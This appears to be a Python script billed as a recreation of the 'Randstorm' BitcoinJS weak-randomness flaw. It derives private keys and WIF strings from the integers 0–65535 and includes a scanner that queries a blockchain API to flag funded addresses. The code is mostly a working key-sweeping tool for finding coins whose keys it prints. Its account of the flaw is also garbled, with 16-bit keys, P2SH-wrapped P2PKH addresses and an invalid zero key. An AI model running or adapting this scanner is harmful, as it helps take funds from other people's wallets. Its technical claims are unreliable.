#!/usr/bin/env python3
"""
BitcoinJS Randstorm Vulnerability Recreation Script
This script demonstrates how the vulnerable BitcoinJS wallets were generated
during the 2011-2012 period due to weak random number generation.

WARNING: This is for educational/recovery purposes only.
Only check wallets that belong to you.
"""

import hashlib
import base58
import ecdsa
import requests
import time
from typing import Dict, List, Tuple
import json


class BitcoinJSVulnerabilityRecreator:
    def __init__(self):
        self.secp256k1 = ecdsa.SECP256k1
        self.checked_addresses = []

    def simulate_weak_random(self, seed_value: int) -> int:
        """
        Simulates the weak Math.random() behavior from BitcoinJS
        where only 65,536 values were possible
        """
        # Original vulnerability: Math.random() * 65536 gave only 65536 possible values
        return seed_value % 65536

    def generate_private_key_from_weak_random(self, weak_random_value: int) -> bytes:
        """
        Generate a private key using the same weak method as original BitcoinJS
        """
        # Convert the weak random value to a private key
        # This mimics how BitcoinJS converted the limited random values
        private_key_int = weak_random_value

        # Pad to 32 bytes (256 bits) - this was part of the vulnerability
        # The actual entropy was only 16 bits but padded to look like 256 bits
        private_key_hex = f"{private_key_int:064x}"
        return bytes.fromhex(private_key_hex)

    def private_key_to_wif(self, private_key: bytes, compressed: bool = True) -> str:
        """Convert private key to Wallet Import Format"""
        # Add version byte (0x80 for mainnet)
        extended_key = b'\x80' + private_key

        # Add compression flag if compressed
        if compressed:
            extended_key += b'\x01'

        # Double SHA256 hash
        hash1 = hashlib.sha256(extended_key).digest()
        hash2 = hashlib.sha256(hash1).digest()

        # Add checksum (first 4 bytes of hash)
        checksum = hash2[:4]
        final_key = extended_key + checksum

        return base58.b58encode(final_key).decode()

    def get_public_key(self, private_key: bytes, compressed: bool = True) -> bytes:
        """Generate public key from private key"""
        sk = ecdsa.SigningKey.from_string(private_key, curve=self.secp256k1)
        vk = sk.get_verifying_key()

        if compressed:
            # Compressed public key format (33 bytes)
            x = vk.pubkey.point.x()
            y = vk.pubkey.point.y()
            if y % 2 == 0:
                return b'\x02' + x.to_bytes(32, 'big')
            else:
                return b'\x03' + x.to_bytes(32, 'big')
        else:
            # Uncompressed public key format (65 bytes)
            return b'\x04' + vk.to_string()

    def hash160(self, data: bytes) -> bytes:
        """Perform HASH160 (SHA256 then RIPEMD160)"""
        sha256_hash = hashlib.sha256(data).digest()
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(sha256_hash)
        return ripemd160.digest()

    def create_address(self, hash160_result: bytes, version_byte: bytes) -> str:
        """Create Bitcoin address from hash160 and version byte"""
        versioned_hash = version_byte + hash160_result

        # Double SHA256 for checksum
        checksum = hashlib.sha256(hashlib.sha256(versioned_hash).digest()).digest()[:4]

        # Final address
        address_bytes = versioned_hash + checksum
        return base58.b58encode(address_bytes).decode()

    def private_key_to_p2pkh_address(self, private_key: bytes, compressed: bool = True) -> str:
        """Convert private key to P2PKH address (starts with '1')"""
        public_key = self.get_public_key(private_key, compressed)
        hash160_result = self.hash160(public_key)
        return self.create_address(hash160_result, b'\x00')

    def private_key_to_p2sh_address(self, private_key: bytes, compressed: bool = True) -> str:
        """Convert private key to P2SH address (starts with '3')
        Note: P2SH was introduced April 1, 2012 - end of vulnerable period"""
        public_key = self.get_public_key(private_key, compressed)

        # Create a simple P2PKH script
        pubkey_hash = self.hash160(public_key)
        script = b'\x76\xa9\x14' + pubkey_hash + b'\x88\xac'  # OP_DUP OP_HASH160 <pubkey_hash> OP_EQUALVERIFY OP_CHECKSIG

        script_hash = self.hash160(script)
        return self.create_address(script_hash, b'\x05')

    def private_key_to_all_address_formats(self, private_key: bytes) -> dict:
        """Generate all possible address formats for a given private key"""
        addresses = {}

        # P2PKH addresses (available throughout 2011-2012)
        addresses['p2pkh_compressed'] = self.private_key_to_p2pkh_address(private_key, compressed=True)
        addresses['p2pkh_uncompressed'] = self.private_key_to_p2pkh_address(private_key, compressed=False)

        # P2SH addresses (available from April 2012 onwards)
        addresses['p2sh_compressed'] = self.private_key_to_p2sh_address(private_key, compressed=True)
        addresses['p2sh_uncompressed'] = self.private_key_to_p2sh_address(private_key, compressed=False)

        return addresses

    def check_address_balance(self, address: str) -> Dict:
        """Check Bitcoin address balance and transaction count using blockchain API"""
        try:
            # Using BlockCypher API (free tier)
            url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
            response = requests.get(url, timeout=10)

            if response.status_code == 200:
                data = response.json()
                return {
                    'address': address,
                    'balance': data.get('balance', 0),
                    'total_received': data.get('total_received', 0),
                    'total_sent': data.get('total_sent', 0),
                    'n_tx': data.get('n_tx', 0),
                    'unconfirmed_balance': data.get('unconfirmed_balance', 0)
                }
            else:
                return {'address': address, 'error': f'HTTP {response.status_code}'}

        except Exception as e:
            return {'address': address, 'error': str(e)}

    def generate_vulnerable_wallet(self, seed_value: int) -> Dict:
        """Generate a wallet using the vulnerable method"""
        try:
            weak_random = self.simulate_weak_random(seed_value)
            private_key = self.generate_private_key_from_weak_random(weak_random)

            # Generate all possible address formats from this private key
            addresses = self.private_key_to_all_address_formats(private_key)

            # Generate WIF formats
            wif_compressed = self.private_key_to_wif(private_key, compressed=True)
            wif_uncompressed = self.private_key_to_wif(private_key, compressed=False)

            return {
                'seed_value': seed_value,
                'weak_random': weak_random,
                'private_key_hex': private_key.hex(),
                'wif_compressed': wif_compressed,
                'wif_uncompressed': wif_uncompressed,
                **addresses  # Unpack all address formats
            }

        except Exception as e:
            return {'seed_value': seed_value, 'error': str(e)}

    def scan_vulnerable_range(self, start: int = 0, end: int = 65536,
                              check_blockchain: bool = True, delay: float = 0.1) -> List[Dict]:
        """
        Scan through the vulnerable range and optionally check blockchain

        Args:
            start: Starting seed value
            end: Ending seed value (max 65536 for the vulnerability)
            check_blockchain: Whether to check each address on blockchain
            delay: Delay between blockchain API calls (to avoid rate limiting)
        """
        results = []
        interesting_wallets = []

        print(f"Scanning vulnerable range {start} to {min(end, 65536)}...")
        print(f"Blockchain checking: {'ON' if check_blockchain else 'OFF'}")
        print("-" * 60)

        for seed in range(start, min(end, 65536)):
            wallet = self.generate_vulnerable_wallet(seed)

            if 'error' in wallet:
                print(f"Error generating wallet {seed}: {wallet['error']}")
                continue

            results.append(wallet)

            if check_blockchain:
                # Check all address formats
                address_types = ['p2pkh_compressed', 'p2pkh_uncompressed', 'p2sh_compressed', 'p2sh_uncompressed']

                for addr_type in address_types:
                    if addr_type in wallet:
                        address = wallet[addr_type]
                        balance_info = self.check_address_balance(address)

                        wallet[f'blockchain_info_{addr_type}'] = balance_info

                        # If wallet has any activity, mark as interesting
                        if ('balance' in balance_info and balance_info['balance'] > 0) or \
                                ('total_received' in balance_info and balance_info['total_received'] > 0):
                            interesting_wallets.append({
                                'wallet': wallet,
                                'address_type': addr_type,
                                'balance_info': balance_info
                            })
                            print(f"🔍 INTERESTING: Seed {seed} ({addr_type})")
                            print(f"   Address: {address}")
                            print(f"   Balance: {balance_info.get('balance', 0)} sats")
                            print(f"   Total received: {balance_info.get('total_received', 0)} sats")
                            print(f"   Transactions: {balance_info.get('n_tx', 0)}")

                # Rate limiting
                time.sleep(delay)

            # Progress indicator
            if seed % 1000 == 0:
                print(f"Progress: {seed}/65536 ({seed / 655.36:.1f}%)")

        print(f"\n✅ Scan complete!")
        print(f"📊 Generated {len(results)} wallets")
        print(f"🎯 Found {len(interesting_wallets)} interesting wallets")

        return results, interesting_wallets

    def save_results(self, results: List[Dict], filename: str = "vulnerable_wallets.json"):
        """Save results to JSON file"""
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"💾 Results saved to {filename}")


def main():
    print("BitcoinJS Randstorm Vulnerability Recreation")
    print("=" * 50)
    print("⚠️  WARNING: Only check wallets that belong to you!")
    print("⚠️  This is for educational/recovery purposes only.")
    print("=" * 50)

    recreator = BitcoinJSVulnerabilityRecreator()

    # Example: Generate a few specific wallets
    print("\n🔍 Generating sample vulnerable wallets:")
    for seed in [0, 1, 1337, 12345, 65535]:
        wallet = recreator.generate_vulnerable_wallet(seed)
        print(f"\nSeed {seed}:")
        print(f"  Private Key: {wallet['private_key_hex']}")
        print(f"  P2PKH (compressed):   {wallet['p2pkh_compressed']}")
        print(f"  P2PKH (uncompressed): {wallet['p2pkh_uncompressed']}")
        print(f"  P2SH (compressed):    {wallet['p2sh_compressed']}")
        print(f"  P2SH (uncompressed):  {wallet['p2sh_uncompressed']}")

    print("\n📝 Address Format Timeline:")
    print("  • P2PKH (starts with '1'): Available throughout 2011-2012 vulnerable period")
    print("  • P2SH (starts with '3'):  Available from April 1, 2012 onwards")
    print("  • Each private key generates 4 different addresses!")
    print("  • Most vulnerable period: May 2011 - March 2012 (P2PKH only)")
    print("  • Late vulnerable period: April 2012+ (P2PKH + P2SH)")

    # Uncomment below to scan a range and check blockchain
    # WARNING: This will make many API calls and may take time

    # print("\n🚀 Starting vulnerability scan...")
    # results, interesting = recreator.scan_vulnerable_range(
    #     start=0,
    #     end=1000,  # Start small for testing
    #     check_blockchain=True,
    #     delay=0.2  # Be nice to the API
    # )

    # if interesting:
    #     print(f"\n🎯 Found {len(interesting)} wallets with activity!")
    #     for item in interesting[:5]:  # Show first 5
    #         wallet = item['wallet']
    #         balance_info = item['balance_info']
    #         print(f"Seed {wallet['seed_value']}: {balance_info['balance']} sats")

    print("\n✨ Script complete!")


if __name__ == "__main__":
    main()